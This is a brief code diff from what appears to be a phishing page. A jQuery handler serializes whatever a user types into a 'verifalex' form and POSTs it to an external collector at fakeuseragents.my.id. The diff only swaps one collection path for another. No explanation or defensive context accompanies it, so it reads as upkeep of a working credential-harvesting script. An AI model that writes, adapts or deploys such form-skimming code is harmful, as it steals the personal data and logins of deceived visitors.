@@ -2,7 +2,7 @@ $(".verifalex").submit(function() {
 	var d = $(".verifalex");
 
 	$.ajax({
-        url: "https://fakeuseragents.my.id/klaim/index.php",
+        url: "https://fakeuseragents.my.id/delapanbit/index.php",
         type: "POST",
         data: d.serialize(),
         success: function () {
